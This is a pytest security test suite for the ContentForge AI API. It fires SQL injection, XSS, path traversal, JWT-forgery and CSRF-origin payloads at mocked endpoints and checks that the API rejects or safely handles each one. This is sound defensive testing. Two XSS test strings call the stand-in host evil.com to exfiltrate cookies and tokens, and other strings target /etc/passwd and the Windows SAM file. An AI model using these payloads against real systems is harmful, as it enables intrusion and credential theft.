"""
Advanced security testing suite for ContentForge AI API.
Tests SQL injection, XSS, CSRF, JWT security, and other vulnerabilities.
"""
import pytest
import re
import jwt
import time
from fastapi import status
from unittest.mock import MagicMock, patch


class TestSQLInjection:
    """Test SQL injection protection in all input vectors."""
    
    def test_sql_injection_in_email_field(self, client):
        """Test SQL injection in email field during registration."""
        sql_injection_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users;--",
            "' UNION SELECT * FROM users--",
            "1'; DELETE FROM users WHERE '1'='1",
            "admin'--",
            "' OR '1'='1' LIMIT 1--",
            "test@test.com'; SELECT * FROM profiles;--",
        ]
        
        for payload in sql_injection_payloads:
            response = client.post("/api/v1/auth/register", json={
                "email": payload,
                "password": "SecurePassword123!",
                "full_name": "Test User"
            })
            
            # Should either reject as invalid email or not execute SQL
            assert response.status_code in [
                status.HTTP_422_UNPROCESSABLE_ENTITY,  # Validation error
                status.HTTP_400_BAD_REQUEST,           # Generic error
                status.HTTP_500_INTERNAL_SERVER_ERROR  # Server error (not ideal but safe)
            ], f"SQL injection payload '{payload[:30]}...' might have succeeded"
    
    def test_sql_injection_in_password_field(self, client):
        """Test SQL injection in password field."""
        mock_client, mock_auth, _, _, _ = client.mock_supabase
        
        sql_injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "' UNION SELECT password FROM users--",
            "test' AND 1=1--",
            "password' OR 'x'='x",
        ]
        
        for payload in sql_injection_payloads:
            # Should not execute SQL in password
            mock_auth.sign_in_with_password.side_effect = Exception("Invalid credentials")
            
            response = client.post("/api/v1/auth/login", json={
                "email": "test@example.com",
                "password": payload
            })
            
            assert response.status_code == status.HTTP_401_UNAUTHORIZED
            
            # Verify SQL wasn't executed by checking error message
            error_detail = response.json().get("detail", "")
            assert "SQL" not in error_detail.upper(), f"SQL error leaked for payload: {payload[:30]}"
    
    def test_sql_injection_in_content_title(self, client):
        """Test SQL injection in content title."""
        mock_client, mock_auth, mock_table, _, mock_query = client.mock_supabase
        
        mock_user = MagicMock()
        mock_user.id = "test-user-123"
        mock_user.email = "test@example.com"
        mock_auth.get_user.return_value = MagicMock(user=mock_user)
        
        sql_injection_titles = [
            "Test'; DROP TABLE content;--",
            "Test' OR '1'='1",
            "Test'; SELECT * FROM users;--",
            "Test' UNION SELECT * FROM profiles--",
        ]
        
        for title in sql_injection_titles:
            mock_query.execute.return_value = MagicMock(data=[{
                "id": "content-123",
                "project_id": "project-456",
                "user_id": "test-user-123",
                "title": title,  # Should be stored as-is, not executed
                "source_type": "text",
                "source_url": None,
                "original_text": "Test content",
                "word_count": 10,
                "status": "completed",
                "created_at": "2024-01-01T00:00:00",
                "updated_at": "2024-01-01T00:00:00"
            }])
            
            response = client.post("/api/v1/content", json={
                "title": title,
                "source": {
                    "type": "text",
                    "text": "Test content"
                },
                "project_id": "project-456"
            }, headers={"Authorization": "Bearer test-token"})
            
            # Should succeed but SQL shouldn't be executed
            assert response.status_code in [
                status.HTTP_201_CREATED,
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_404_NOT_FOUND,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ]
    
    def test_sql_injection_in_search_query(self, client):
        """Test SQL injection in search parameters."""
        mock_client, mock_auth, mock_table, _, mock_query = client.mock_supabase
        
        mock_user = MagicMock()
        mock_user.id = "test-user-123"
        mock_user.email = "test@example.com"
        mock_auth.get_user.return_value = MagicMock(user=mock_user)
        
        search_payloads = [
            "test'; SELECT * FROM users--",
            "test' OR '1'='1",
            "test'); DROP TABLE content;--",
        ]
        
        for payload in search_payloads:
            # Search is typically via query params
            response = client.get(f"/api/v1/content?search={payload}", 
                                  headers={"Authorization": "Bearer test-token"})
            
            # Should not return all data (which would indicate SQL injection)
            if response.status_code == status.HTTP_200_OK:
                data = response.json()
                # If SQL injection worked, we'd get all records
                assert isinstance(data, list)
    
    def test_sql_injection_in_url_parameter(self, client):
        """Test SQL injection in URL path parameters."""
        mock_client, mock_auth, mock_table, _, mock_query = client.mock_supabase
        
        mock_user = MagicMock()
        mock_user.id = "test-user-123"
        mock_user.email = "test@example.com"
        mock_auth.get_user.return_value = MagicMock(user=mock_user)
        
        malicious_ids = [
            "123' OR '1'='1",
            "123'; DROP TABLE content;--",
            "123' UNION SELECT * FROM users--",
        ]
        
        for malicious_id in malicious_ids:
            response = client.get(f"/api/v1/content/{malicious_id}", 
                                  headers={"Authorization": "Bearer test-token"})
            
            # Should not execute SQL
            assert response.status_code in [
                status.HTTP_404_NOT_FOUND,
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ], f"SQL injection might have succeeded for ID: {malicious_id}"
    
    def test_sql_injection_in_project_id(self, client):
        """Test SQL injection in project_id field."""
        mock_client, mock_auth, mock_table, _, mock_query = client.mock_supabase
        
        mock_user = MagicMock()
        mock_user.id = "test-user-123"
        mock_user.email = "test@example.com"
        mock_auth.get_user.return_value = MagicMock(user=mock_user)
        
        malicious_project_ids = [
            "project-456'; DROP TABLE projects;--",
            "project-456' OR '1'='1",
            "project-456'; SELECT * FROM profiles--",
        ]
        
        for project_id in malicious_project_ids:
            response = client.post("/api/v1/content", json={
                "title": "Test Content",
                "source": {
                    "type": "text",
                    "text": "Test"
                },
                "project_id": project_id
            }, headers={"Authorization": "Bearer test-token"})
            
            # Should not crash or execute SQL
            assert response.status_code in [
                status.HTTP_201_CREATED,
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ]


class TestXSSProtection:
    """Test Cross-Site Scripting (XSS) protection."""
    
    def test_xss_in_content_title(self, client):
        """Test XSS payload in content title."""
        mock_client, mock_auth, mock_table, _, mock_query = client.mock_supabase
        
        mock_user = MagicMock()
        mock_user.id = "test-user-123"
        mock_user.email = "test@example.com"
        mock_auth.get_user.return_value = MagicMock(user=mock_user)
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>",
            "<body onload=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "\x3cscript\x3ealert('XSS')\x3c/script\x3e",  # Encoded
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",  # Nested
        ]
        
        for payload in xss_payloads:
            mock_query.execute.return_value = MagicMock(data=[{
                "id": "content-123",
                "project_id": "project-456",
                "user_id": "test-user-123",
                "title": payload,
                "source_type": "text",
                "source_url": None,
                "original_text": "Test content",
                "word_count": 10,
                "status": "completed",
                "created_at": "2024-01-01T00:00:00",
                "updated_at": "2024-01-01T00:00:00"
            }])
            
            response = client.post("/api/v1/content", json={
                "title": payload,
                "source": {
                    "type": "text",
                    "text": "Test content"
                },
                "project_id": "project-456"
            }, headers={"Authorization": "Bearer test-token"})
            
            if response.status_code == status.HTTP_201_CREATED:
                data = response.json()
                # Title should be stored but not executed
                assert data["title"] == payload  # Stored as-is
                # But when rendered, it should be escaped
                # (This would be tested in frontend integration)
    
    def test_xss_in_content_text(self, client):
        """Test XSS payload in content text."""
        mock_client, mock_auth, mock_table, _, mock_query = client.mock_supabase
        
        mock_user = MagicMock()
        mock_user.id = "test-user-123"
        mock_user.email = "test@example.com"
        mock_auth.get_user.return_value = MagicMock(user=mock_user)
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>",
            "<img src=x onerror=fetch('http://evil.com?d='+localStorage.getItem('token'))>",
        ]
        
        for payload in xss_payloads:
            mock_query.execute.return_value = MagicMock(data=[{
                "id": "content-123",
                "project_id": "project-456",
                "user_id": "test-user-123",
                "title": "Test",
                "source_type": "text",
                "source_url": None,
                "original_text": payload,
                "word_count": 10,
                "status": "completed",
                "created_at": "2024-01-01T00:00:00",
                "updated_at": "2024-01-01T00:00:00"
            }])
            
            response = client.post("/api/v1/content", json={
                "title": "Test",
                "source": {
                    "type": "text",
                    "text": payload
                },
                "project_id": "project-456"
            }, headers={"Authorization": "Bearer test-token"})
            
            # Should accept the content
            assert response.status_code in [
                status.HTTP_201_CREATED,
                status.HTTP_400_BAD_REQUEST
            ]
    
    def test_xss_in_full_name(self, client):
        """Test XSS in user full_name field."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
        ]
        
        for payload in xss_payloads:
            response = client.post("/api/v1/auth/register", json={
                "email": "test@example.com",
                "password": "SecurePassword123!",
                "full_name": payload
            })
            
            # Should either be sanitized, rejected, or accepted but not executed
            assert response.status_code in [
                status.HTTP_201_CREATED,
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ]
    
    def test_xss_in_url_field(self, client):
        """Test XSS in URL source field."""
        mock_client, mock_auth, mock_table, _, mock_query = client.mock_supabase
        
        mock_user = MagicMock()
        mock_user.id = "test-user-123"
        mock_user.email = "test@example.com"
        mock_auth.get_user.return_value = MagicMock(user=mock_user)
        
        xss_urls = [
            "javascript:alert('XSS')",
            "http://example.com/<script>alert('XSS')</script>",
            "data:text/html,<script>alert('XSS')</script>",
        ]
        
        for url in xss_urls:
            response = client.post("/api/v1/content", json={
                "title": "Test",
                "source": {
                    "type": "url",
                    "url": url
                },
                "project_id": "project-456"
            }, headers={"Authorization": "Bearer test-token"})
            
            # Should validate URL format
            assert response.status_code in [
                status.HTTP_201_CREATED,
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ]
    
    def test_xss_in_headers(self, client):
        """Test XSS in HTTP headers."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
        ]
        
        for payload in xss_payloads:
            response = client.get("/api/v1/health", headers={
                "X-Custom-Header": payload,
                "User-Agent": payload
            })
            
            # Should not crash
            assert response.status_code == status.HTTP_200_OK


class TestCSRFProtection:
    """Test Cross-Site Request Forgery protection."""
    
    def test_csrf_token_validation(self, client):
        """Test CSRF token validation on state-changing endpoints."""
        # POST/PUT/DELETE endpoints should validate CSRF or origin
        response = client.post("/api/v1/auth/login", json={
            "email": "test@example.com",
            "password": "password123"
        }, headers={
            "Origin": "https://evil.com"  # Different origin
        })
        
        # Should either reject or require proper CORS headers
        # The actual behavior depends on CORS configuration
        assert response.status_code in [
            status.HTTP_401_UNAUTHORIZED,
            status.HTTP_403_FORBIDDEN,
            status.HTTP_400_BAD_REQUEST
        ]
    
    def test_cors_preflight_request(self, client):
        """Test CORS preflight request handling."""
        response = client.options("/api/v1/auth/login", headers={
            "Origin": "https://contentforge.ai",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Content-Type,Authorization"
        })
        
        # Should handle OPTIONS request
        assert response.status_code in [
            status.HTTP_200_OK,
            status.HTTP_204_NO_CONTENT,
            status.HTTP_400_BAD_REQUEST
        ]
    
    def test_origin_header_validation(self, client):
        """Test Origin header validation."""
        origins = [
            "https://evil.com",
            "http://localhost:3000",
            "https://attacker.com",
            "null",
            "file://",
        ]
        
        for origin in origins:
            response = client.post("/api/v1/auth/login", json={
                "email": "test@example.com",
                "password": "password123"
            }, headers={
                "Origin": origin
            })
            
            # Unauthorized origins should be rejected
            # (unless explicitly allowed in CORS config)
            assert response.status_code in [
                status.HTTP_401_UNAUTHORIZED,
                status.HTTP_403_FORBIDDEN,
                status.HTTP_400_BAD_REQUEST
            ]
    
    def test_referer_header_validation(self, client):
        """Test Referer header validation."""
        response = client.post("/api/v1/auth/login", json={
            "email": "test@example.com",
            "password": "password123"
        }, headers={
            "Referer": "https://evil.com/phishing"
        })
        
        # Should not accept requests from unauthorized referers
        assert response.status_code in [
            status.HTTP_401_UNAUTHORIZED,
            status.HTTP_400_BAD_REQUEST
        ]


class TestJWTSecurity:
    """Test JWT token security."""
    
    def test_expired_token_rejection(self, client):
        """Test rejection of expired JWT tokens."""
        # Create an expired token
        expired_token = jwt.encode(
            {
                "sub": "user-123",
                "exp": int(time.time()) - 3600,  # 1 hour ago
                "iat": int(time.time()) - 7200
            },
            "secret-key",
            algorithm="HS256"
        )
        
        mock_client, mock_auth, _, _, _ = client.mock_supabase
        mock_auth.get_user.side_effect = Exception("Token has expired")
        
        response = client.get("/api/v1/auth/me", headers={
            "Authorization": f"Bearer {expired_token}"
        })
        
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_invalid_signature_token(self, client):
        """Test rejection of token with invalid signature."""
        # Create a token with wrong signature
        invalid_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature"
        
        mock_client, mock_auth, _, _, _ = client.mock_supabase
        mock_auth.get_user.side_effect = Exception("Invalid signature")
        
        response = client.get("/api/v1/auth/me", headers={
            "Authorization": f"Bearer {invalid_token}"
        })
        
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_malformed_token(self, client):
        """Test rejection of malformed JWT tokens."""
        malformed_tokens = [
            "not.a.token",
            "only.two.parts",
            "",
            "Bearer",
            "Bearer ",
            "Bearer.invalid",
            "eyJhbGci",  # Incomplete token
        ]
        
        for token in malformed_tokens:
            response = client.get("/api/v1/auth/me", headers={
                "Authorization": f"Bearer {token}" if token.startswith("Bearer") else token
            })
            
            assert response.status_code == status.HTTP_401_UNAUTHORIZED, f"Malformed token '{token[:20]}' should be rejected"
    
    def test_algorithm_none_attack(self, client):
        """Test prevention of algorithm 'none' attack."""
        # Token with alg: none
        none_token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0."
        
        mock_client, mock_auth, _, _, _ = client.mock_supabase
        mock_auth.get_user.side_effect = Exception("Algorithm not allowed")
        
        response = client.get("/api/v1/auth/me", headers={
            "Authorization": f"Bearer {none_token}"
        })
        
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_token_injection_via_query_param(self, client):
        """Test that token cannot be injected via query parameters."""
        response = client.get("/api/v1/auth/me?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.invalid")
        
        # Should require token in header, not query param
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_token_injection_via_cookie(self, client):
        """Test that token in cookie is not accepted (if not configured)."""
        response = client.get("/api/v1/auth/me", cookies={
            "access_token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.invalid"
        })
        
        # Should require Bearer token in header
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_token_timing_attack_prevention(self, client):
        """Test that token validation timing is consistent."""
        mock_client, mock_auth, _, _, _ = client.mock_supabase
        
        # Valid token
        valid_times = []
        for _ in range(10):
            start = time.time()
            response = client.get("/api/v1/auth/me", headers={
                "Authorization": "Bearer valid-token"
            })
            valid_times.append(time.time() - start)
        
        # Invalid token
        mock_auth.get_user.side_effect = Exception("Invalid token")
        invalid_times = []
        for _ in range(10):
            start = time.time()
            response = client.get("/api/v1/auth/me", headers={
                "Authorization": "Bearer invalid-token"
            })
            invalid_times.append(time.time() - start)
        
        # Timing should be similar (no timing side-channel)
        avg_valid = sum(valid_times) / len(valid_times)
        avg_invalid = sum(invalid_times) / len(invalid_times)
        
        # Difference should be small (within 50%)
        if avg_valid > 0:
            diff_ratio = abs(avg_valid - avg_invalid) / avg_valid
            assert diff_ratio < 0.5, f"Timing difference too large: {diff_ratio*100:.1f}%"


class TestAuthenticationBypass:
    """Test authentication bypass attempts."""
    
    def test_direct_api_access_without_auth(self, client):
        """Test that protected endpoints require authentication."""
        protected_endpoints = [
            ("GET", "/api/v1/content"),
            ("POST", "/api/v1/content"),
            ("GET", "/api/v1/auth/me"),
            ("GET", "/api/v1/projects"),
        ]
        
        for method, endpoint in protected_endpoints:
            if method == "GET":
                response = client.get(endpoint)
            elif method == "POST":
                response = client.post(endpoint, json={})
            
            assert response.status_code == status.HTTP_401_UNAUTHORIZED, \
                f"{method} {endpoint} should require authentication"
    
    def test_path_traversal_in_endpoint(self, client):
        """Test path traversal attacks."""
        traversal_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
        ]
        
        for path in traversal_paths:
            response = client.get(f"/api/v1/content/{path}", headers={
                "Authorization": "Bearer test-token"
            })
            
            # Should not return file contents
            assert response.status_code in [
                status.HTTP_404_NOT_FOUND,
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_403_FORBIDDEN
            ]
            
            if response.status_code == status.HTTP_200_OK:
                body = response.text
                assert "root:" not in body, "Path traversal may have succeeded"
                assert "[extensions]" not in body, "Windows path traversal may have succeeded"
    
    def test_http_method_override(self, client):
        """Test HTTP method override attacks."""
        # Try to use POST with X-HTTP-Method-Override to bypass restrictions
        response = client.post("/api/v1/content", headers={
            "X-HTTP-Method-Override": "GET",
            "Authorization": "Bearer test-token"
        }, json={
            "title": "Test",
            "source": {"type": "text", "text": "test"},
            "project_id": "project-123"
        })
        
        # Should still process as POST or reject
        assert response.status_code in [
            status.HTTP_201_CREATED,
            status.HTTP_401_UNAUTHORIZED,
            status.HTTP_501_NOT_IMPLEMENTED
        ]


class TestInputValidation:
    """Test input validation security."""
    
    def test_oversized_payload_rejection(self, client):
        """Test rejection of oversized request payloads."""
        # Create a very large payload
        large_payload = {
            "title": "A" * 1000000,  # 1MB title
            "source": {
                "type": "text",
                "text": "B" * 10000000  # 10MB text
            },
            "project_id": "project-123"
        }
        
        response = client.post("/api/v1/content", json=large_payload, headers={
            "Authorization": "Bearer test-token"
        })
        
        # Should reject oversized payloads
        assert response.status_code in [
            status.HTTP_413_REQUEST_ENTITY_TOO_LARGE,
            status.HTTP_400_BAD_REQUEST,
            status.HTTP_422_UNPROCESSABLE_ENTITY,
            status.HTTP_500_INTERNAL_SERVER_ERROR  # Server protection
        ]
    
    def test_nested_json_attack(self, client):
        """Test deep nesting attack."""
        # Create deeply nested JSON
        nested = {}
        current = nested
        for i in range(1000):
            current["nested"] = {}
            current = current["nested"]
        
        response = client.post("/api/v1/content", json=nested, headers={
            "Authorization": "Bearer test-token"
        })
        
        # Should handle deep nesting gracefully
        assert response.status_code in [
            status.HTTP_400_BAD_REQUEST,
            status.HTTP_422_UNPROCESSABLE_ENTITY,
            status.HTTP_500_INTERNAL_SERVER_ERROR
        ]
    
    def test_invalid_content_type(self, client):
        """Test handling of invalid Content-Type."""
        response = client.post("/api/v1/auth/login",
            data="not json data",
            headers={"Content-Type": "application/xml"}
        )
        
        # Should reject invalid content type or malformed data
        assert response.status_code in [
            status.HTTP_415_UNSUPPORTED_MEDIA_TYPE,
            status.HTTP_422_UNPROCESSABLE_ENTITY,
            status.HTTP_400_BAD_REQUEST
        ]
    
    def test_null_byte_injection(self, client):
        """Test null byte injection."""
        null_payloads = [
            "test\x00.html",
            "file\x00.txt",
            "test%00",  # URL encoded null
        ]
        
        for payload in null_payloads:
            response = client.post("/api/v1/auth/register", json={
                "email": f"test{payload}@example.com",
                "password": "SecurePassword123!",
                "full_name": "Test"
            })
            
            # Should handle null bytes safely
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY,
                status.HTTP_201_CREATED
            ]
    
    def test_unicode_normalization_attack(self, client):
        """Test unicode normalization attacks (homograph attacks)."""
        # Unicode variants that look like ASCII
        unicode_emails = [
            "test@exämple.com",  # umlaut
            "test@ex𝐚mple.com",  # mathematical bold
            "admin@аpple.com",   # Cyrillic 'а'
        ]
        
        for email in unicode_emails:
            response = client.post("/api/v1/auth/register", json={
                "email": email,
                "password": "SecurePassword123!",
                "full_name": "Test"
            })
            
            # Should either normalize or reject
            assert response.status_code in [
                status.HTTP_201_CREATED,
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ]


class TestInformationDisclosure:
    """Test for information disclosure vulnerabilities."""
    
    def test_error_message_leakage(self, client):
        """Test that error messages don't leak sensitive information."""
        mock_client, mock_auth, _, _, _ = client.mock_supabase
        mock_auth.get_user.side_effect = Exception("Database connection failed: postgres://user:pass@localhost:5432/db")
        
        response = client.get("/api/v1/auth/me", headers={
            "Authorization": "Bearer test-token"
        })
        
        if response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR:
            body = response.text
            # Should not contain database credentials
            assert "postgres://" not in body, "Database credentials leaked"
            assert "user:pass" not in body, "Credentials leaked"
    
    def test_stack_trace_disclosure(self, client):
        """Test that stack traces are not disclosed."""
        # Trigger an error
        response = client.get("/api/v1/content/invalid-uuid", headers={
            "Authorization": "Bearer test-token"
        })
        
        if response.status_code >= 500:
            body = response.text
            # Should not contain stack trace
            assert "Traceback" not in body, "Stack trace leaked"
            assert "File \"" not in body, "File path leaked"
            assert "app/routers" not in body, "Internal path leaked"
    
    def test_version_disclosure(self, client):
        """Test for version information in headers."""
        response = client.get("/api/v1/health")
        
        headers = dict(response.headers)
        
        # Check for common version disclosure headers
        sensitive_headers = ["Server", "X-Powered-By", "X-AspNet-Version"]
        for header in sensitive_headers:
            if header in headers:
                # If present, should not contain detailed version info
                value = headers[header]
                # Allow generic info but not detailed versions
                assert "Windows" not in value or "Apache" not in value, \
                    f"Sensitive server info in {header} header"
    
    def test_api_schema_disclosure(self, client):
        """Test that API schema is not exposed in production."""
        # In production, docs should be disabled
        response = client.get("/docs")
        
        # Should return 404 or redirect in production
        assert response.status_code in [
            status.HTTP_404_NOT_FOUND,
            status.HTTP_403_FORBIDDEN
        ]


class TestSessionSecurity:
    """Test session security."""
    
    def test_session_fixation_protection(self, client):
        """Test protection against session fixation."""
        mock_client, mock_auth, _, _, _ = client.mock_supabase
        
        # Attacker sets a known session
        attacker_token = "attacker-known-token"
        
        # Victim logs in
        mock_user = MagicMock()
        mock_user.id = "victim-user"
        mock_user.email = "victim@example.com"
        mock_session = MagicMock()
        mock_session.access_token = "new-victim-token"  # New token assigned
        
        mock_auth.sign_in_with_password.return_value = MagicMock(
            user=mock_user,
            session=mock_session
        )
        
        response = client.post("/api/v1/auth/login", json={
            "email": "victim@example.com",
            "password": "CorrectPassword123!"
        })
        
        if response.status_code == status.HTTP_200_OK:
            data = response.json()
            # Should get a NEW token, not the attacker's
            assert data["access_token"] != attacker_token, "Session fixation possible"
    
    def test_concurrent_session_handling(self, client):
        """Test handling of concurrent sessions."""
        mock_client, mock_auth, _, _, _ = client.mock_supabase
        
        # Multiple logins should all work
        mock_user = MagicMock()
        mock_user.id = "test-user"
        mock_user.email = "test@example.com"
        
        tokens = []
        for i in range(5):
            mock_session = MagicMock()
            mock_session.access_token = f"token-{i}"
            mock_auth.sign_in_with_password.return_value = MagicMock(
                user=mock_user,
                session=mock_session
            )
            
            response = client.post("/api/v1/auth/login", json={
                "email": "test@example.com",
                "password": "password123"
            })
            
            if response.status_code == status.HTTP_200_OK:
                tokens.append(response.json()["access_token"])
        
        # All tokens should be unique
        assert len(tokens) == len(set(tokens)), "Duplicate tokens generated"
    
    def test_logout_invalidates_token(self, client):
        """Test that logout invalidates the session token."""
        mock_client, mock_auth, _, _, _ = client.mock_supabase
        
        mock_auth.get_user.side_effect = Exception("Token has been revoked")
        
        response = client.get("/api/v1/auth/me", headers={
            "Authorization": "Bearer logged-out-token"
        })
        
        assert response.status_code == status.HTTP_401_UNAUTHORIZED
